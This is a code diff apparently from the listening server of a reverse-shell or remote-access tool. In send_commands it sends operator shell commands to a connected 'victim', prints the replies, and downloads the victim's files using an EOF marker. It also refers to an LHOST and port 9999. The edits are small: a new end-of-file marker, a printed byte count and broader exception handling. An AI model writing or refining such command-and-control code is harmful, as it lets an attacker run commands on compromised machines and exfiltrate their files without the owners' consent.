@@ -28,6 +28,7 @@ def send_commands(conn):
                 receive_file = True
 
                 victim_response = conn.recv(1024)
+
                 if victim_response.endswith(b"Requested file not found"):
                     print("Requested file not found on the client")
                     victim_response = conn.recv(4096)
@@ -36,7 +37,7 @@ def send_commands(conn):
                 else:
                     with open(down_file, 'wb') as f:
                         while receive_file:
-                            if victim_response.endswith(b"ool"):
+                            if victim_response.endswith(b"EOFEOFEOFEOFEOF"):
                                 print("Download completed")
                                 data = victim_response[:-15]
                                 f.write(data)
@@ -74,7 +75,8 @@ def send_commands(conn):
             elif len(str.encode(cmd)) > 0:
                 """In case of other shell commands, sent them to the victim and take the  answer
                 """
-                conn.send(str.encode(cmd))
+                nr_bytes = conn.send(str.encode(cmd))
+                print(nr_bytes)
                 victim_response = conn.recv(4096)
                 print(victim_response.decode("utf-8"))
             elif cmd == '':
@@ -120,8 +122,8 @@ def main():
         print("Set LHOST: %s" % host)
         port = 9999
         create_socket()
-    except (ValueError, OSError, OverflowError):
-        print("You entered invalid data")
+    except Exception as e:
+        print(e)
         main()
 
 
